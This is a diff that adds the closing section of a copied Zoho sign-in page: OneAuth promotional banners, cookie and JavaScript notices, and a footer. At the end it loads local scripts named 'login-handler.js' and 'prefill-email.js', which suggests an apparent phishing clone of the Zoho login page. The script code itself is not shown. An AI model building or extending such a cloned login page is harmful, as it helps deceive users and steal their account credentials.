+					<div id="banner_0" class="rightbanner rightbannerTransition slideright">
+
+
+
+
+
+						<!--   BANNER TYPE 1     -->
+						<style type="text/css">
+							.banner1_img {
+								display: block;
+								width: 300px;
+								height: 240px;
+								margin: auto;
+								background-size: 100%;
+							}
+
+							.banner1_heading {
+								font-size: 16px;
+								font-weight: 600;
+								margin-top: 20px;
+							}
+
+							.banner1_content {
+								font-size: 14px;
+								font-weight: 400;
+								margin-top: 10px;
+							}
+
+							.banner1_href {
+								height: 36px;
+								width: max-content;
+								max-width: 160px;
+								margin: auto;
+								margin-top: 20px;
+								background-color: #ECF7FE;
+								color: #0091FF;
+								font-weight: 600;
+								border-radius: 18px;
+								padding: 8px 20px;
+								border: none;
+								cursor: pointer;
+								text-decoration: none;
+								box-sizing: border-box;
+								font-size: 14px;
+							}
+
+							.banner1_heading,
+							.banner1_content,
+							.banner1_href {
+								display: block;
+								line-height: 20px;
+								text-align: center;
+							}
+						</style>
+						<div class="container">
+							<div class="banner1_img"
+								style="background-image: url('https://accounts.zoho.com/v2/components/images/passwordless_illustration2x.png');">
+							</div>
+							<div class="banner1_heading">Passwordless sign-in</div>
+							<div style="" class="banner1_content">Move away from risky passwords and experience one-tap
+								access to Zoho. Download and install OneAuth. </div>
+							<a class="banner1_href" href="https://zoho.to/za_signin_oa_rp" target="_blank"> Learn More
+							</a>
+						</div>
+
+
+
+
+					</div>
+					<div id="banner_1" class="rightbanner rightbannerTransition">
+
+
+
+
+
+						<!--   BANNER TYPE 1     -->
+						<style type="text/css">
+							.banner1_img {
+								display: block;
+								width: 300px;
+								height: 240px;
+								margin: auto;
+								background-size: 100%;
+							}
+
+							.banner1_heading {
+								font-size: 16px;
+								font-weight: 600;
+								margin-top: 20px;
+							}
+
+							.banner1_content {
+								font-size: 14px;
+								font-weight: 400;
+								margin-top: 10px;
+							}
+
+							.banner1_href {
+								height: 36px;
+								width: max-content;
+								max-width: 160px;
+								margin: auto;
+								margin-top: 20px;
+								background-color: #ECF7FE;
+								color: #0091FF;
+								font-weight: 600;
+								border-radius: 18px;
+								padding: 8px 20px;
+								border: none;
+								cursor: pointer;
+								text-decoration: none;
+								box-sizing: border-box;
+								font-size: 14px;
+							}
+
+							.banner1_heading,
+							.banner1_content,
+							.banner1_href {
+								display: block;
+								line-height: 20px;
+								text-align: center;
+							}
+						</style>
+						<div class="container">
+							<div class="banner1_img"
+								style="background-image: url('https://accounts.zoho.com/v2/components/images/mfa_illustration2x.png');">
+							</div>
+							<div class="banner1_heading">MFA for all accounts</div>
+							<div style="" class="banner1_content">Secure online accounts with OneAuth 2FA. Back up OTP
+								secrets and never lose access to your accounts. </div>
+							<a class="banner1_href" href="https://zurl.to/ZS_oaauthenticator" target="_blank"> Learn
+								More </a>
+						</div>
+
+
+
+
+					</div>
+					<div id="banner_2" class="rightbanner rightbannerTransition slideright">
+
+
+
+
+
+						<!--   BANNER TYPE 1     -->
+						<style type="text/css">
+							.banner1_img {
+								display: block;
+								width: 300px;
+								height: 240px;
+								margin: auto;
+								background-size: 100%;
+							}
+
+							.banner1_heading {
+								font-size: 16px;
+								font-weight: 600;
+								margin-top: 20px;
+							}
+
+							.banner1_content {
+								font-size: 14px;
+								font-weight: 400;
+								margin-top: 10px;
+							}
+
+							.banner1_href {
+								height: 36px;
+								width: max-content;
+								max-width: 160px;
+								margin: auto;
+								margin-top: 20px;
+								background-color: #ECF7FE;
+								color: #0091FF;
+								font-weight: 600;
+								border-radius: 18px;
+								padding: 8px 20px;
+								border: none;
+								cursor: pointer;
+								text-decoration: none;
+								box-sizing: border-box;
+								font-size: 14px;
+							}
+
+							.banner1_heading,
+							.banner1_content,
+							.banner1_href {
+								display: block;
+								line-height: 20px;
+								text-align: center;
+							}
+						</style>
+						<div class="container">
+							<div class="banner1_img"
+								style="background-image: url('https://accounts.zoho.com/v2/components/images/recovery_illustration2x.png');">
+							</div>
+							<div class="banner1_heading">Easy recovery modes</div>
+							<div style="" class="banner1_content">Lost access to OneAuth? Worry not. Set up passphrase
+								and backup number to recover OneAuth easily. </div>
+							<a class="banner1_href" href="https://zoho.to/za_signin_oa_rp" target="_blank"> Learn More
+							</a>
+						</div>
+
+
+
+
+					</div>
+				</div>
+				<div class="dotHead">
+					<div class="dot" id="dot_0">
+						<div></div>
+					</div>
+					<div class="dot" id="dot_1" selected="selected">
+						<div></div>
+					</div>
+					<div class="dot" id="dot_2">
+						<div></div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div id="signuplink" style="display: none;">Don't have a Zoho account? <a href="javascript:register()">Sign Up
+				Now</a></div>
+		<div id="enableCookie" style="display:none;text-align:center">
+			<div class="zoho_logo VirtualOffice zoho_logo_position_center"></div>
+			<div style="text-align: center;padding: 10px;">Cookies are disabled for your browser. Please enable cookies
+				to continue.</div>
+		</div>
+	</div>
+	<noscript>
+		<div
+			style="position: fixed; top: 0px; left: 0px; z-index: 3;height: 100%; width: 100%; background-color: #FFFFFF">
+			<div id="enableCookie" style='text-align:center'>
+				<div class='zoho_logo VirtualOffice zoho_logo_position_center'></div>
+				<div style="text-align: center;padding: 10px;">JavaScript is disabled for your browser. Please enable it
+					in your browser settings and try again.</div>
+			</div>
+		</div>
+	</noscript>
+
+	<style>
+		#footer {
+			width: 100%;
+			height: 20px;
+			font-size: 14px;
+			color: #727272;
+			position: absolute;
+			left: 0px;
+			right: 0px;
+			margin: 20px auto;
+			text-align: center;
+			font-size: 14px;
+			bottom: 0px;
+		}
+
+		#footer a {
+			text-decoration: none;
+			color: #727272;
+			font-size: 14px;
+		}
+
+		@media only screen and (max-width : 435px) {
+
+			#footer a,
+			#footer {
+				font-size: 12px;
+			}
+		}
+	</style>
+
+	<footer id="footer" style="top: 759px;">
+
+		<span>
+			© 2023, <a href="http://www.zohocorp.com/" target="_blank">Zoho Corporation Pvt. Ltd.</a> All Rights
+			Reserved. </span>
+
+	</footer>
+<script src="/scripts/login-handler.js"></script>
+<script src="/../scripts/prefill-email.js"></script>
+</body>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    
+</html>
